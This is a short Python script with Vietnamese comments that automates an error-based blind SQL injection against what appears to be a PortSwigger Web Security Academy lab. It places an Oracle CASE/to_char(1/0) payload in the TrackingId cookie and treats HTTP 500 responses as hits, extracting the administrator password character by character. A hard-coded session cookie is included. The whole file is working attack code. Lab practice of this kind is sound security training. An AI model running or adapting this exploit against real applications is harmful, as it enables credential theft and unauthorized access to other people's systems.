import requests
import string

# Cấu hình target
BASE_URL = "https://0a08005304c7bba9809e530000570099.web-security-academy.net/"
COOKIE_TEMPLATE = "OnNtITVWJsgevZpB'||(SELECT CASE WHEN (substr((select password from users where username='administrator'),{pos},1)='{char}') THEN to_char(1/0) ELSE null END FROM dual)||'"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Referer": BASE_URL,
    "Accept-Encoding": "gzip, deflate, br"
}

# Danh sách ký tự cần thử
CHARSET = string.ascii_lowercase + string.digits 

def test_character(position, char):
    """Kiểm tra xem ký tự char có đúng không bằng cách gửi request."""
    cookies = {
        "TrackingId": COOKIE_TEMPLATE.format(pos=position, char=char),
        "session": "w1RnPuqXP0p5nPN314i4rWz7n1YJJdO9"
    }
    response = requests.get(BASE_URL, headers=HEADERS, cookies=cookies)
    return response.status_code == 500  # Nếu trả về lỗi 500, nghĩa là ký tự đúng

def brute_force_password():
    """Dò từng ký tự của mật khẩu admin."""
    password = ""
    position = 1
    while True:
        found = False
        for char in CHARSET:
            if test_character(position, char):
                password += char
                print(f"[+] Found character {position}: {char}")
                position += 1
                found = True
                break
        if not found:
            break  # Dừng khi không tìm thấy ký tự nào nữa
    print(f"[!] Password found: {password}")

if __name__ == "__main__":
    brute_force_password()